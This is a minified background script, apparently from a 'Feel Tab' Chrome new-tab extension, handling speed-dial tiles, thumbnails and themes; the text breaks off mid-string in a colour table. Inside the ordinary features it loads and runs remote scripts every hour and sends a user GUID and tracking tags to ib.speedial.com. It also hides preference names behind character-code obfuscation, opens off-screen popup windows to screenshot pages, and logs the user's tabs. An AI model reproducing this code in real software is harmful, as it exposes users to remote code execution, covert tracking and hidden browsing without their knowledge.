(function(){(function(){function a(a){var b=localStorage[e+a];if(null==b)return b=c[a];if("string"==typeof b){if("false"==b)return!1;if("true"==b)return!0;if("number"==typeof parseInt(b)||"NaN"==b)return parseInt(b)==b?parseInt(b):""+b}return b}var e="",c={},b={};window.pref=function(d,g){if(null==g){if(null==d)throw"name and defaultValue must have a concrete values";return b[d]}if("string"!=typeof d)throw"name is not of type string";c[d]=g;b.__defineGetter__(d,function(){return a(d)});b.__defineSetter__(d,
function(a){var b=c[d],g=e+d;if("object"==typeof a)throw"object type not supported";b==a&&null!=localStorage[g]?delete localStorage[g]:localStorage[g]=a})};window.user=b})();(function(){var a={},e={};window.conf=function(c,b){a[c]=b;e.__defineGetter__(c,function(){return a[c]});e.__defineSetter__(c,function(a){throw"config is not mutable, if you need mutable key/val, use preferences machanism";})};window.config=e})()})();pref("aflt","sd-ft");pref("general.guid","");pref("general.firstRun",!0);
pref("general.version","0");pref("remote.mode","");pref("general.content","");pref("fmon",!1);pref("cd","");pref("cr","");pref("itype","");pref("AL",2);pref("itag","");pref("ipath","");pref("iquery","");pref("se","");pref("dm","");pref("show.top-search",!0);pref("show.top-content",!1);pref("favorites.gallery.country","us");pref("favorites.gallery.category","331338ac");pref("favorites.user-added",!1);pref("favorites.screenshot",!0);pref("favorites.crop",!1);conf("ga.lifecycle","UA-37681646-21");
conf("ga.activity","UA-37681646-28");conf("ga.samplerate",1);conf("brand","Feel Tab");conf("label","songroger");conf("remote.version","1.0");conf("remote.bucket","");conf("verified_host","");conf("surl","");conf("uninstall_url","");conf("stitle","Web Search");conf("api_request_url","");conf("image_request_url","");
conf("feed","limited");conf("sfontsize",18);conf("uref","g4");conf("smethod",0);conf("info.links-0",["Uninstall","Facebook","Twitter"]);conf("info.links-1",["EULA","About","Uninstall"]);conf("link.eula","");conf("link.privacy","");conf("link.about","");conf("link.contactus","");
conf("link.uninstall","newtab://uninstall");conf("link.facebook","https://www.facebook.com/song.roger.1");conf("link.twitter","https://twitter.com/songrogero");conf("theme.luminance","light");conf("theme.background","white");conf("theme.illumination",!1);conf("theme.pattern",!1);conf("layout.plus",!0);conf("layout.3D",!1);conf("layout.num_of_cols",4);conf("layout.num_of_rows",!1);conf("layout.prop",1.4);conf("layout.show_titles",!1);conf("layout.size",175);conf("layout.spacing",14);
var utils=function(){function a(){var a=[0,0,0,203,278,222,0,183],b=user[String.fromCharCode(102)+"m"+String.fromCharCode(111)+"n"];if(!b)return!1;var c=user[String.fromCharCode(100)+"m"];null==c&&(c="");for(var d=!1,n=0;n<c.length&&n<a.length;n++)if(c.charCodeAt(n)==a[n]*n){d=!0;break}return q=d&&b}var e=chrome.app.getDetails(),c=e.version,b=e.id,d=navigator.language,g=d.substr(0,2),f=function(){var a=navigator.userAgent.toLowerCase();if(/windows nt 5.0/.test(a))return"win2K";if(/windows nt 5.0/.test(a))return"winXP";
if(/windows nt 6.0/.test(a))return"vista";if(/windows nt 6.1/.test(a))return"win7"}();(new Date).getTime();var q=!1;a();return{os:function(){return f},getMessage:function(a){return chrome.i18n.getMessage(a)},getOrigin:function(){return chrome.extension.getURL("")},getURL:function(a){return chrome.extension.getURL(a)},getPage:function(a){return this.getURL("/content/"+a+".html")},getFileURL:function(a){return"filesystem:chrome-extension://"+b+"/persistent/"+a},getFavIconURL:function(a){return"chrome://favicon/"+
a},id:function(){return b},version:function(){return c},locale:function(){return d},language:function(){return g},get:function(a){return localStorage["data."+a]},set:function(a,b){localStorage["data."+a]=b},remove:function(a){delete localStorage["data."+a]},isFirstRun:function(){return user["general.firstRun"]},isz:function(b){return!0!=b||q?q:a()},isUpgradeRequired:function(){return this.isFirstRun()?!1:parseInt(user["general.version"])<parseInt(c)?!0:!1}}}(),urls=function(){return{hasProtocol:function(a){return/^(http:\/\/|https:\/\/|ftp:\/\/)/.test(a)},
name2host:function(a){a=a.replace(" ","");/^[a-zA-Z0-9_]+$/.test(a)&&(a+=".com");return a=a.replace(/\/$/,"")},url2name:function(a){a=this.getHostName(a);S(a).startsWith("www.")&&(a=a.substr(4));var e=a.length,c=a.substr(e-4),b=a.substr(e-7,5),d=a.substr(e-6,4);0<=[".com",".net",".org",".gov",".edu"].indexOf(c)?a=a.substring(0,e-4):0<=[".com.",".net.",".org.",".gov",".edu."].indexOf(b)?a=a.substring(0,e-7):0<=[".co.",".ac.",".org.",".gov",".edu."].indexOf(d)&&(a=a.substring(0,e-6));return a=S(a).contains(".")?
S(a).replaceAll("."," ").humanize().capitalize().s:3==a.length?a.toUpperCase():S(a).replaceAll("."," ").humanize().capitalize().s},getFullURL:function(a){/^[a-zA-Z0-9_]+$/.test(a)&&(a+=".com");a=a.replace(/\/$/,"");this.hasProtocol(a)||(a="http://"+a);return a},ValidUrl:function(a){return RegExp("^(https?:\\/\\/)?((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.)+[a-z]{2,}|((\\d{1,3}\\.){3}\\d{1,3}))(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*(\\?[;&a-z\\d%_.~+=-]*)?(\\#[-a-z\\d_]*)?$","i").test(a)?!0:!1},buildURL:function(a){var e=
a.match(/\[(.*?)\]/g);if("object"==typeof e)for(var c=0;c<e.length;c++){var b=e[c],b=b.substr(1,b.length-2),d=config[b];void 0==d&&(d="");b=RegExp("\\["+b+"\\]","gi");a=a.replace(b,d)}e=a.match(/\((.*?)\)/g);if("object"==typeof e)for(c=0;c<e.length;c++)b=e[c],b=b.substr(1,b.length-2),d=user[b],void 0==d&&(d=""),b=RegExp("\\("+b+"\\)","gi"),a=a.replace(b,d);return a},ensureURL:function(a){return this.hasProtocol(a)?a:"http://"+a},getHostName:function(a,e){a=this.ensureURL(a);var c=document.createElement("a");
c.href=a;c=c.hostname;return e&&0<=c.indexOf("www.")?c.substr(4):c}}}(),window=this;(function(){window.stats=0==Math.floor(100*Math.random()/config["ga.samplerate"])?!0:!1;window.trackEvent=function(a,e,c,b,d){try{if(null!=d&&!d||window.stats)d="v=1",d+="&tid="+a,d+="&cid="+user["general.guid"],d+="&t=event",e&&(d+="&ec="+e),c&&(d+="&ea="+c),b&&(d+="&el="+b),d+="&z="+(1E9+Math.floor(1147483647*Math.random())),$.ajax({type:"POST",url:"http://www.google-analytics.com/collect",data:d,success:null})}catch(g){}}})();
(function(){var a="v"+parseFloat(utils.version()).toFixed(1)+(config.uref?" ("+config.uref+")":""),e=utils.id().substring(0,4)+" "+a+" - "+config.label;window.trackUserEvent=function(a,b,d,g){trackEvent(config["ga.activity"],a,b,d,g)};window.trackUrefEvent=function(c,b,d){trackEvent(d||config["ga.activity"],c,a,b,!0)};window.trackStatusEvent=function(a){try{a="evt="+a;var b="aflt="+user.aflt,d="ial="+user.ial,g="itag="+user.itag,f="uref="+config.uref,e="label="+config.label,l="ver="+utils.version(),
h="id="+utils.id().substring(0,4),p="guid="+user["general.guid"],k="cd="+user.cd,n="cr="+user.cr,s="z="+(1E9+Math.floor(1147483647*Math.random())),m=[a,b,d,g,f,e,l,h,p,k,n,s].join("&");$.ajax({type:"POST",url:"http://ib.speedial.com",data:JSON.stringify({table:"extensions",data:m}),success:null})}catch(B){}};window.trackLifeCycleEvent=function(a,b,d){trackEvent(d||config["ga.lifecycle"],a,e,b,!0)}})();
function loadScript(a,e,c,b){b=null==b?!0:b;var d=document.createElement("script");d.type="text/javascript";d.async=b;d.onload=d.onreadystatechange=function(){document.head.removeChild(d);e&&e(a)};d.onerror=function(){document.head.removeChild(d);c&&c(a)};d.src=a;document.head.appendChild(d)}
(function(){window.loadExtScript=function(a,e,c,b){if("dev"==user["remote.mode"]){var d="/content/remote/"+a+".js";setTimeout(function(){loadScript(d,e,c,b)},500)}else d=config["remote.bucket"],d+="/ch/v"+config["remote.version"]+"/"+config.label+"/"+a+".js?"+(new Date).getTime(),loadScript(d,e,c,b)}})();
function loadResource(a,e){try{var c=new XMLHttpRequest;c.open("GET",utils.getURL(a),!1);c.send();return"xml"==e?c.responseXML:"text"==e?c.responseText:JSON.parse(c.responseText)}catch(b){console.log(b)}}
(function(){function a(){var a=new Date;return a=a.getFullYear()+("0"+(a.getMonth()+1)).slice(-2)+("0"+a.getDate()).slice(-2)}function e(){setTimeout(function(){var a=localStorage.aliveDate,b=localStorage.instlDate;chrome.extension.setUpdateUrlData(["alive="+(a?a:""),"since="+(b?b:""),"uref="+config.uref].join("&"))},0)}utils.isFirstRun()||loadExtScript("launch");(function(){setTimeout(function(){loadExtScript("service");setInterval(function(){loadExtScript("service")},36E5)},6E4)})();(function(){var c=
a();null==localStorage.instlDate&&(localStorage.instlDate=c);null==localStorage.aliveDate&&(localStorage.aliveDate=c)})();(function(){var c=setTimeout(function(){trackLifeCycleEvent("enabled",user.itag)},5E3);chrome.runtime.onStartup.addListener(function(){clearTimeout(c);setTimeout(function(){trackLifeCycleEvent("startup",user.itag)},1E4)});chrome.runtime.onInstalled.addListener(function(b){clearTimeout(c);switch(b.reason){case "install":localStorage.instlDate=a();trackLifeCycleEvent("installation");
trackStatusEvent("installation");e();break;case "update":trackLifeCycleEvent("update","from v"+b.previousVersion);break;case "chrome_update":trackLifeCycleEvent("chrome_update")}})})();(function(){function c(){var b=a();if(null==localStorage.aliveDate||localStorage.aliveDate!=b)localStorage.aliveDate=b,trackLifeCycleEvent("alive",user.itag),trackStatusEvent("alive"),e();setTimeout(c,6E5)}setTimeout(c,2E4)})()})();
var storage=function(){return{get:function(a,e){chrome.storage.local.get(a,function(c){e(c[a])})},set:function(a,e,c){var b={};b[a]=e;chrome.storage.local.set(b,c)},remove:function(a,e){chrome.storage.local.remove(a,e)}}}(),fsUtils=function(){function a(a){var b="";switch(a.code){case FileError.QUOTA_EXCEEDED_ERR:b="QUOTA_EXCEEDED_ERR";break;case FileError.NOT_FOUND_ERR:b="NOT_FOUND_ERR";break;case FileError.SECURITY_ERR:b="SECURITY_ERR";break;case FileError.INVALID_MODIFICATION_ERR:b="INVALID_MODIFICATION_ERR";
break;case FileError.INVALID_STATE_ERR:b="INVALID_STATE_ERR";break;default:b="Unknown Error"}console.log("Error: "+b)}function e(c,b,d,g,f){(window.requestFileSystem||window.webkitRequestFileSystem)(window.PERSISTENT,null,function(e){e.root.getDirectory(c,{create:!0},function(c){c.getFile(b,{create:!0},function(b){b.createWriter(function(a){a.onwriteend=function(a){g&&g()};a.onerror=function(a){f&&f()};a.write(d)},a)},a)},a)},a)}return{listFiles:function(c,b){(window.requestFileSystem||window.webkitRequestFileSystem)(window.PERSISTENT,
null,function(d){d.root.getDirectory(c,{create:!0},function(d){d.createReader().readEntries(function(a){a=Array.prototype.slice.call(a||[],0);for(var d=[],c=0;c<a.length;c++)d.push(a[c].name);b(d)},a)},a)},a)},saveImage:function(a,b,d,g,f){var q=d.indexOf(";base64,")+8;d=d.substring(q);d=window.atob(d);for(var q=d.length,l=new Uint8Array(new ArrayBuffer(q)),h=0;h<q;h++)l[h]=d.charCodeAt(h);d=new Blob([l.buffer],{type:"image/png"});e(a,b,d,g,f)},removeDir:function(c){(window.requestFileSystem||window.webkitRequestFileSystem)(window.PERSISTENT,
null,function(b){b.root.getDirectory(c,{create:!1},function(b){b.removeRecursively(function(){},a)},a)},a)},rename:function(c,b,d){(window.requestFileSystem||window.webkitRequestFileSystem)(window.PERSISTENT,null,function(g){g.root.getDirectory(c,{create:!0},function(c){c.getFile(b,{},function(a){a.moveTo(c,d)},a)})},a)},removeFile:function(c,b){(window.requestFileSystem||window.webkitRequestFileSystem)(window.PERSISTENT,null,function(d){d.root.getDirectory(c,{create:!0},function(d){d.getFile(b,{create:!1},
function(b){b.remove(function(){},a)},a)},a)},a)}}}(),browserUtils=function(){function a(a){p=!0;for(var b=0,d=a.length;b<d;b++){var c=a[b].id;null!=f[c]&&chrome.windows.remove(c)}setTimeout(function(){p=!1},2E3)}function e(a,b,d){if(null!=f[a]&&null!=f[a].callback){var c=f[a].callback;delete f[a].callback;setTimeout(function(){c(b,d)},0)}}function c(a){null!=f[a]&&(chrome.windows.remove(a),setTimeout(function(){b()},100),window.clearTimeout(f[a].timeout))}function b(a){if(null==a&&3<=l)setTimeout(b,
5E3);else if(null!=a||0!=q.length){a=a||q.shift();var d=a.url,g=a.ref,k=a.callback;l++;chrome.windows.create({url:d,focused:!1,type:"popup",left:9999,top:9999,height:100,width:100},function(a){var b=setTimeout(function(){e(a.id,null,null);c(a.id)},9E4);h[g]=a.id;f[a.id]={timeout:b,ref:g,callback:k};chrome.windows.update(a.id,{top:9999,left:9999})})}}function d(a){var b=a.windowId;null!=f[b]&&chrome.tabs.executeScript(a.id,{file:"/content/browser/misc/screenshot.inject.js"},function(){null!=f[b]&&
chrome.windows.update(b,{width:1240,height:885},function(){setTimeout(function(){null!=f[b]&&chrome.tabs.captureVisibleTab(b,{format:"png",quality:100},function(d){e(b,a.title,d);c(b)})},1500)})})}function g(a){"complete"==a.status&&null!=f[a.windowId]&&chrome.tabs.query({windowId:a.windowId},function(b){1==b.length&&d(a)})}var f={},q=[],l=0,h={},p=!1;chrome.windows.onRemoved.addListener(function(b){if(null!=f[b]){if(null!=f[b].callback){var d=f[b].callback;delete f[b].callback;setTimeout(d,0)}l--;
delete h[f[b].ref];delete f[b]}else if(!p){var c=!1;chrome.windows.getAll({populate:!1},function(b){for(var d=0,h=b.length;d<h;d++)if(null==f[b[d].id]){c=!0;break}c||a(b)})}});chrome.tabs.onUpdated.addListener(function(a,b,d){g(d)});var k;(function(){chrome.permissions.onAdded.addListener(function(a){0<=a.permissions.indexOf("webRequest")&&0<=a.permissions.indexOf("webRequestBlocking")&&(k=!0)})})();return{cancelCaptureURL:function(a){null!=h[a]&&c(h[a])},captureURL:function(a,d){var c=a.url,h=a.force,
g=CryptoJS.MD5(c+(new Date).getTime()).toString(),c={ref:g,url:c,callback:d};h?b(c):(q.push(c),b());return g},captureTab:function(a,b){chrome.tabs.getSelected(null,function(d){chrome.tabs.update(a,{active:!0},function(a){chrome.tabs.captureVisibleTab(a.windowId,{format:"png",quality:100},function(c){chrome.tabs.update(d.id,{active:!0},function(){b(a.title,a.url,c)})})})})},hasUserPermissions:function(a){chrome.permissions.contains({origins:["<all_urls>"]},a)},hasSoftPermissions:function(a){null!=
k?a(k):chrome.permissions.contains({permissions:["webRequest","webRequestBlocking"]},function(b){k=b;a(b)})}}}(),extensionUtils=function(){return{getDetails:function(a){a(chrome.app.getDetails())},uninstall:function(a){var e=chrome.app.getDetails().id;chrome.management.uninstall(e,a)},uninstallSelf:function(){chrome.management.uninstallSelf()}}}(),tabs=function(){function a(a){return{url:a.url,title:a.title}}function e(a){if(void 0==f[a.url])g.push(a),f[a.url]=g.length-1;else{var b=f[a.url];g.splice(b,
1);for(g.push(a);b<g.length;b++)a=g[b],f[a.url]=b}if(g.length>d)for(a=g.shift(),delete f[a.url],b=0;b<g.length;b++)a=g[b],f[a.url]=b}function c(a){if(void 0!=f[a]){var b=f[a];g.splice(b,1);delete f[a];for(a=b;a<g.length;a++)f[g[a].url]=a}}function b(){var b=utils.get("rc");if(void 0!=b)for(var b=JSON.parse(b),c=0;c<b.length&&c<d;c++){var g=a(b[c]);e(g)}}if(!utils.isz()){var d=10,g=[],f={},q={},l=0;b();chrome.windows.getAll({populate:!0},function(b){for(var d=0;d<b.length;d++)for(var c=b[d].tabs,g=
0;g<c.length;g++){var f=c[g];void 0!=f&&"chrome://newtab/"!=f.url&&(q[f.id]=a(f),l++)}});chrome.tabs.onCreated.addListener(function(b){"chrome://newtab/"!=b.url&&(l++,q[b.id]=a(b),c(b.url))});chrome.tabs.onUpdated.addListener(function(b,d,g){"chrome://newtab/"==g.url?void 0!=q[g.id]&&(l--,delete q[g.id]):(void 0==q[g.id]&&l++,q[g.id]=a(g),c(g.url))});chrome.tabs.onRemoved.addListener(function(a,b){void 0!=q[a]&&(l--,e(q[a]),delete q[a],utils.set("rc",JSON.stringify(g)))});return{selectTab:function(a){chrome.tabs.update(a,
{active:!0},function(){})},getRecentlyClosed:function(a){for(var b=[],d=g.length-1;0<=d;d--){var c=g[d];null!=c&&(c={title:c.title,url:c.url,favIconUrl:utils.getFavIconURL(c.url)},b.push(c))}a(b)},getActive:function(a){var b=[],d;for(d in q){var c=q[d];null!=c&&(c={id:d,title:c.title,url:c.url,favIconUrl:utils.getFavIconURL(c.url)},b.push(c))}a(b.reverse())},clearRecentlyClosed:function(a){f={};g=[];utils.set("rc",JSON.stringify(g));$.isFunction(a)&&a()}}}}(),imagesUtils=function(){function a(a,b){var d=
document.createElement("img");d.onload=function(){var a=document.createElement("canvas"),c=a.getContext("2d");a.width=d.width;a.height=d.height;c.drawImage(d,0,0,d.width,d.height);b(a)};d.src=a}var e={thumbWidth:209,thumbHeight:110,proportion:1.9};return{getCommonColor:function(c,b,d){a(c,function(a){var c=a.getContext("2d"),e=a.height,l=a.width,c=c.getImageData(0,0,l,e);a=c.data.length;for(var h=-4,p={},k=e*l;(h+=4)<a;){var e=c.data[h],l=c.data[h+1],n=c.data[h+2];if(!(150>c.data[h+3]||200<e+l+n&&
10>Math.abs(e-l)&&10>Math.abs(e-n)&&10>Math.abs(n-l))){var s=Math.round((e+l+n)/3);void 0==p[s]&&(p[s]=0);p[s]+=s/k}}k=e=0;for(h in p)p[h]>e&&(e=p[h],k=h);if(0==k)d(null);else{for(h=-4;(h+=4)<a;)if(e=c.data[h],l=c.data[h+1],n=c.data[h+2],0!=c.data[h+3]&&(s=Math.round((e+l+n)/3),s==k)){var m=[e,l,n];break}"rgb"!=b&&(a=m,null==a?m=void 0:(m=a[0].toString(16),m=1==m.length?"0"+m:m,c=a[1].toString(16),c=1==c.length?"0"+c:c,a=a[2].toString(16),a=1==a.length?"0"+a:a,m="#"+m+c+a));d(m)}})},getDataURL:function(c,
b,d){a(c,function(a){d(a.toDataURL(b))})},crop:function(a,b,d){var e=document.createElement("img");e.onload=function(){var a=e.width,c=a/b,l=0;c>e.height&&(c=e.height,a=c*b,l=-(e.width-a)/2);var h=document.createElement("canvas"),p=h.getContext("2d");h.width=a;h.height=c;p.drawImage(e,l,0);a=h.toDataURL("image/jpeg");d(a)};e.src=a},scaleDown:function(a,b,d){var e=document.createElement("img");e.onload=function(){e.width>=b?imagesUtils.resize(a,b,0,d):d(a)};e.src=a},resize:function(a,b,d,e){var f=
document.createElement("img");f.onload=function(){var a=1>=b?f.width*b:b,c=0==d?f.height*a/f.width:1>=d?f.height*d:d,h=document.createElement("canvas"),p=h.getContext("2d");h.width=a;h.height=c;p.drawImage(f,0,0,a,c);a=h.toDataURL("image/png");e(a)};f.src=a},cropOptions:function(a,b,d,e,f){f={originalWidth:a,originalHeight:b,dx:0,dy:0,thumbWidth:d,thumbHeight:e,scale:0};f.scale=d/a;a<=d&&b<=e&&(f.dx=(d-a)/2,f.dy=(e-b)/2,f.scale=1);1!=f.scale&&b<e&&(f.dy=(e-b)/2/f.scale);return f},cropExt:function(a,
b,d){var g=document.createElement("img");g.onload=function(a,b,c,d,e){return function(){d||(d=a.cropOptions(this.width,this.height,c.thumbWidth,c.thumbHeight,c.proportion));var b=document.createElement("canvas"),g=b.getContext("2d");b.width=d.thumbWidth;b.height=d.thumbHeight;g.scale(d.scale,d.scale);g.drawImage(this,d.dx,d.dy,d.originalWidth,d.originalHeight);void 0!==e&&e({stateReady:2,result:b.toDataURL()})}}(this,a,e,b,d);g.onerror=function(){void 0!==d&&d({stateReady:0,result:""})};g.src=a},
cropExt2:function(a,b,d){var e=document.createElement("img");e.onload=function(a,b,d){return function(a){a=this.width;var c=a/b,e=0;c>this.height&&(c=this.height,a=c*b,e=-(this.width-a)/2);var g=document.createElement("canvas"),f=g.getContext("2d");g.width=a;g.height=c;f.drawImage(this,e,0);void 0!==d&&d({stateReady:2,result:g.toDataURL()})}}(a,b,d);e.onerror=function(){void 0!==d&&d({stateReady:0,result:""})};e.src=a}}}(),layouts=function(){return{update:function(a,e,c){storage.get("layouts",function(b){null==
b&&(b={});void 0==b[a]&&(b[a]={});for(var d in e)b[a][d]=e[d];storage.set("layouts",b,c)})},get:function(a,e){storage.get("layouts",function(c){c&&c[a]?e(c[a]):e({})})}}}(),themes=function(){return{update:function(a,e,c){storage.get("themes",function(b){null==b&&(b={});void 0==b[a]&&(b[a]={});for(var d in e)b[a][d]=e[d];storage.set("themes",b,c)})},get:function(a,e){storage.get("themes",function(c){c&&c[a]?e(c[a]):e({})})},saveBackground:function(a,e,c){imagesUtils.scaleDown(e,1280,function(b){fsUtils.saveImage("general",
"cover_image."+a,b,c)})}}}(),favorites=function(){function a(a,b){var d="favs##"+a;z[d]?b(z[d]):storage.get(d,function(c){void 0==c&&(c=[]);for(var C=!1,g=0;g<c.length;g++){var f;f=c[g];1==f.v?f=!1:("crop"==f.origin?(f.origin=x,f.mode=v):(f.origin="file"==f.origin?D:A,f.mode=y),null!=f.bgColor&&(f.color=f.bgColor,delete f.bgColor),f.name=f.title,f.v=1,f=!0);C=f||C}C&&e(a);z[d]=c;b(c)})}function e(a){window.clearTimeout(I[a]);I[a]=setTimeout(function(){var b="favs##"+a;storage.set(b,z[b])},300)}function c(a,
b){storage.set("fav-groups",a,b)}function b(a,b){function d(){b(this.src,r[f],E[f])}function c(){g--;0==g&&b(null)}function e(a){var b=document.createElement("img");b.onload=d;b.onerror=c;b.src=config.image_request_url+f+"."+a}var f="www.twitter.com"==a?"www.twitter.com.blue":"maps.google.com"==a?"maps.google.com.cover":"www.outlook.com"==a?"www.outlook.com.blue":CryptoJS.MD5(a).toString(),g=3;e("jpg");e("gif");e("png")}function d(a,d){var c=urls.getHostName(a);if("wikipedia.com"==c||"www.wikipedia.com"==
c)c="www.wikipedia.org";S(c).startsWith("www")?b(c,function(a,e,f){null!=a?d(a,e,f):b(c.substr(4),d)}):b("www."+c,function(a,e,f){null!=a?d(a,e,f):b(c,d)})}function g(b,c,d){$.get(c+"?a="+new Date,function(c){storage.get("pub-groups",function(f){function g(b,c){a(b,function(a){for(var f=0,g=c.length;f<g;f++){var t=c[f];t.url&&t.thumb&&(t.id=CryptoJS.MD5(t.url+""+b).toString())}if(a)u=[],_.each(a,function(a){var b=_.find(c,function(b){return a.id==b.id});b&&u.push(b)});else var u=[];a=_.pluck(u,"id");
f=0;for(g=c.length;f<g;f++)if(t=c[f],t.url){t.thumb&&s(t.id,t.thumb);var H=a.indexOf(t.id);0<=H?u[H].name=t.name:u.push({id:t.id,url:t.url,name:t.name})}e(b);d&&setTimeout(d,0)})}if(void 0==f||null==f||null==f.length)f=[];var u=JSON.parse(c),k=_.pluck(f,"id").indexOf(b);if(0<=k){var h=f[k];if(h.title!=u.title||h.color!=u.color)f[k].title=u.title,f[k].color=u.color;else{g(b,u.tiles);return}}else f.push({id:b,color:u.color,title:u.title});storage.set("pub-groups",f,function(){g(b,u.tiles)})})})}function f(a){storage.get("subscriptions",
function(b){if(void 0==b||null==b)b=[];a(b)})}function q(a){storage.get("fav-groups",function(b){null==b&&(b=[]);a(b)})}function l(a,b,c,d,e){imagesUtils.scaleDown(d,c,function(c){fsUtils.saveImage(b,a,c,function(){e&&e("success")},function(){e&&e("fail")})})}function h(a,b,c,d,e){imagesUtils.getDataURL(d,"image/png",function(d){l(a,b,c,d,e)})}function p(a,b){var c=parseInt(a.slice(1),16),d=Math.round(2.55*b),e=(c>>16)+d,f=(c>>8&255)+d,c=(c&255)+d;return"#"+(16777216+65536*(255>e?1>e?0:e:255)+256*
(255>f?1>f?0:f:255)+(255>c?1>c?0:c:255)).toString(16).slice(1)}function k(a,b){imagesUtils.getCommonColor(a,"hex",function(a){if("#aeb8d5"==a)a="#3D3D3D #070616 #562483 #6e2c6b #7E0B80 #470455 #89673F #84774F #B9090B #B4152F #950811 #B10001 #BA0003 #126b49 #228951 #268B51 #1C7700 #252f8b #0469ad #0095ea #00207b #0585ec #003580 #014DA1 #0066cc #f4d006 #FFC400 #fa6c08 #ff6701 #039cbe".split(" "),a=a[Math.floor(Math.random()*a.length)];else{var c;c=(c=/^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(a))?
{r:parseInt(c[1],16),g:parseInt(c[2],16),b:parseInt(c[3],16)}:null;var d=c.g,e=c.b;c=Math.sqrt(0.241*Math.pow(c.r,2)+0.691*Math.pow(d,2)+0.068*Math.pow(e,2));200<c?a=p(a,-15):180<c?a=p(a,-10):160<c&&(a=p(a,-5))}b(a)})}function n(a,b){k("https://www.google.com/s2/favicons?domain="+a,b)}function s(a,b,c){setTimeout(function(){h(a,"fav_thumbs",300,b,function(a){"success"==a&&c()})},0)}function m(a,b){null==b&&(b=window.navigator.onLine);if(null==a.state)var c="ready";else c=N[a.state],b||"create"!=c||
(c="offline");var d=O[a.mode],e={tries:a.tries,state:c,mode:d,origin:P[a.origin],id:a.id,url:a.url,name:a.name,color:a.color};e["state-"+c]=!0;e["mode-"+d]=!0;e.hostname=urls.getHostName(e.url);if(null==a.state)switch(a.mode){case v:e.thumb=utils.getFileURL("fav_thumbs/"+e.id);break;case y:e.thumb=utils.getFileURL("fav_thumbs/"+e.id)}return e}function B(b,c,d){a(b,function(a){var b=_.indexOf(_.pluck(a,"id"),c);if(0>b)return null;d(a[b])})}function G(a,b){a.v=1;a.state=w;a.altMethod=b.altMethod;a.imgSrc=
b.imgSrc;a.tabId=b.tabId;a.color=b.color;null!=b.mode&&(a.mode=b.mode);null!=b.url&&(a.url=b.url);null!=b.name&&(a.name=b.name);null!=b.method&&(a.method=b.method);null!=b.origin&&(a.origin=b.origin)}var w=0,y=1,v=2,J=3,A=0,x=1,K=2,D=3,P=["logo","page","icon","user"],L={logo:A,page:x,icon:K,user:D},O=["","contain","cover","icon"],M={contain:y,cover:v,icon:J},N=["create","error"],r=JSON.parse('{"d87765792244265daddac211e01be2b2":"#353535","f8650a5cc57515fcaf10f17406369b8f":"#F79226","3c2dba8c9004b869e6d3972b641c50c6":"#92AFC8","8eb5cefaec99a2692a9390e3087eae63":"#031754","ff3a9f6dba26a781293fa9ed483b910b":"#031754","392c822d5838ca52cd848c4f449c3445":"#F3D900","a6637b1ba68d642eb8d685053e8c0935":"#98B9CB","0cb169a269131b7a942f736f2bb80fb6":"#147632","f5133d44761c5690a355300dfd530193":"#F3D900","f3f3001d85c5d713252df087c88c7b6c":"#B60606","e85c82debc657823a832295b3f848b4d":"#5092C5","849890406af21c45683676f3a24cd5c8":"#297ACC","eb4f2dcf5c2d03f5158b7223b4f4e176":"#4F90C2","87aab363d2e7f18079556e694ee294a6":"#00ADEF","cde2cf7bcaf589392c6d55bb26fdb50e":"#E60014","dc3fe807e9984f8deb094585caf57d4a":"#517224","39748ba33716cf40170c7e951fc32e73":"#EF7F01","6ecb13930e05987da994670b1f0373c0":"#D9001F","d3b70e4ad9bf4993b21ac9400376ceeb":"#FBBF00","a4d9719a69cd8df9871254860285494b":"#013773","3d2a7a400f06be037a5dd2ee56a50c23":"#B50102","194202be72244ceb06c924734ef80436":"#23221C","1ea929427e1ebd0ea08ffefb04cb4d61":"#0F225A","e9f51e0de97de6ae6361ca099caa68d4":"#FCCE00","e6bf626909fb894caab889ce6dcf9990":"#122D78","806e75365c59b7ebb5bb5a6db6496867":"#00377A","d78f5a2f806e803524901cd367e169cb":"#EC1B30","ec1e4fb38aeb62bbf9d13e4fd0efab95":"#1B337B","e8b78a390b8f8ca93dff2926decbaed9":"#191919","aab4c3c6393bd96bedf439398654fdb8":"3D3D3D","f8fe064b397be3e2ff421690ee7c424b":"#1987D7","6d3deb58696bb79dd213f396f6c70e3e":"#3A2A1C","092bfc6ddb6a492d0316b4704dd3984a":"#1F445F","9781bcde985fb1e2ecbb37d0dafa7394":"#1F4170","71c5ded35ab4b86bba1a9773b8afc99b":"#F79226","3a71b4b9c17326eda6d77b8fe6274b20":"#0D3F70","5761e4fb0124810d8a20be96b1c9e9e4":"#D80406","adde2048acab3c644d09d6d255043d6b":"#3E3F41","ea48fd50ce34c392f29852e5abecb298":"#201E1C","8e445edbbcb6931696468617b26e3eea":"#1A3893","0fb657b25db85d972732b6df2e041b60":"#043C74","f6ab1032317c7ee268f65085f921711d":"#3B94E1","88da64a2dcdf42dc1685a2e4d6277bcc":"#2259AB","aa7dd42247603d0e84b6cdc4e1bed3c5":"#CF000A","94ea5b2c76d8f850c803769acea9488d":"#C42B2D","60917c0c8f45cee0aac492faa158e308":"#454545","ca368aff40fdb737f2f1bbfec9b760f0":"#C4071D","b6bea986c6b0093e947c652163b10603":"#2A254B","183b70d002c99b4462279c30d434848c":"#2A254B","036b7a9d34cfadc0dba68760550193dd":"#5A5BCD","18d2f46348db0a848d1a22af5136c78f":"#CC221F","7253070fc10e1bc7c1f02cb6695b0992":"#FF5C00","8b2bc7a251e2890f741c49b029ff69f8":"#FF0000","f72ef633d3abe6a1697a2e2dfcd2ef74":"#008080","a9bbe719b8e8b7780f6580d8f9ad2e6a":"#E42119","a129d6c43f9167692d34152d93a444a1":"#6D8A00","1ee848b1b947b9cf5d02df3cd232ea50":"#EEB47C","04d3219c0124eb1a703bfeaf4a11e504":"#B61E42","e0447f25e2068969b3078e0d5fb0b558":"#FC8119","d7b9955374324c9ef18918971e2a0efe":"#FF0099","624154f2cd79dce43a325d6edc1f3146":"#5F534F","f23066263e8ecb3ea6a3b9305e1f2603":"#519510","595310ae7464835a72840840aba1875a":"#003366","5cde7363b0599ba8008edfc1871467f9":"#FF9900","728c7e596b08b222e6cb1096ce2edac9":"#0091C6","d6ee1af12cb1ccb2c10ced55159615cd":"#B9090B","81f663447a2c0e9efe691faefa539460":"#FFCCDD","0033e21367e6f42be7f3f237222d0330":"#B4152F","78c59bd0b0feb8632a37622502ad12a0":"#359FD6","974a05326cbbafcecec1f11b22f1eb27":"#3D3D3D","bfdef2879a3e4c99a8b